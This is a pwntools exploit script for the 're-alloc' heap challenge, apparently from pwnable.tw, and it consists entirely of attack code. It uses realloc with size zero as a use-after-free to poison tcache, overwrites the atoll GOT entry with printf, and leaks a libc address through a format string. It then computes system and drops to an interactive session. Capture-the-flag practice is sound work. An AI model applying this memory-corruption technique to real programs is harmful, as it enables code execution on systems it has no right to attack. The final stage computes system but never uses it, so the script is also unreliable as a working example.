from pwn import *
p = process("./re-alloc")
#p = remote("chall.pwnable.tw", 10106)
elf = ELF("./re-alloc")
libc = elf.libc
#libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
pause()

def alloc(idx, size, data):
    p.sendlineafter(":", "1")
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Size:", str(size))
    p.sendlineafter("Data:", data)

def realloc(idx, size, data):
    p.sendlineafter(": ", "2")
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Size:", str(size))
    if(size >= 1):
        p.sendlineafter("Data:", data)
    
def free(idx):
    p.sendlineafter(": ", "3")
    p.sendlineafter("Index:", str(idx))

alloc(0, 0x20, "a" * 0x20)
realloc(0, 0, "a" * 4)
realloc(0, 0x30, p64(elf.got['atoll']))
alloc(1, 0x20, "a" * 0x20)
free(0)
realloc(1, 0x40, "c" * 0x40)
free(1)

alloc(0, 0x8, "a" * 0x8)
realloc(0, 0, "a" * 4)
realloc(0, 0x50, p64(elf.got['atoll']))
alloc(1, 0x08, "a" * 0x8)
free(0)
realloc(1, 0x60, "a" * 0x60)
free(1)

alloc(0, 0x20, p64(elf.plt['printf']))

p.sendlineafter(":", "1")
p.sendlineafter("Index:", "%23$p")
__libc_start_main = (int(p.recv(14), 16)) - 235
libc_base = __libc_start_main - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
p.info("libc_base : " + hex(libc_base))

p.sendline("1")
sleep(0.1)
p.sendline("")
sleep(0.1)
p.sendline("a" * 8)
sleep(0.1)
p.interactive()
